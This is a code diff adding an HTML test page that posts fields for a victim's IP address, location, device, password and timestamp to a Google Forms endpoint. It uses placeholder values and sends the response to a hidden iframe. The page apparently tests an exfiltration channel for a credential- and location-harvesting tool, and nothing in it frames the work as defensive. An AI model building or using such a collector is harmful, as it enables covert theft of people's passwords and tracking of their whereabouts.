@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Form Test</title>
+</head>
+<body>
+    <h2>Google Form Direct Test</h2>
+    <form action="https://docs.google.com/forms/d/e/1FAIpQLSdQyV5OS_7zngPwjATKVBblGOoTIliTzhZR1C56iMbp8ggBzg/formResponse" method="POST" target="hidden_iframe">
+        <label>IP Address:</label><br>
+        <input type="text" name="entry.1105311194" value="TEST_IP"><br><br>
+        
+        <label>Location:</label><br>
+        <input type="text" name="entry.1117585929" value="TEST_LOCATION"><br><br>
+        
+        <label>Device:</label><br>
+        <input type="text" name="entry.1604626916" value="TEST_DEVICE"><br><br>
+        
+        <label>Password:</label><br>
+        <input type="text" name="entry.1784433534" value="TEST_PASSWORD"><br><br>
+        
+        <label>Time:</label><br>
+        <input type="text" name="entry.1471436276" value="TEST_TIME"><br><br>
+        
+        <input type="submit" value="Test Submit">
+    </form>
+    
+    <iframe name="hidden_iframe" style="display:none;"></iframe>
+    
+    <script>
+        document.querySelector('form').addEventListener('submit', function() {
+            alert('Form submitted! Check your Google Form responses.');
+        });
+    </script>
+</body>
+</html> 
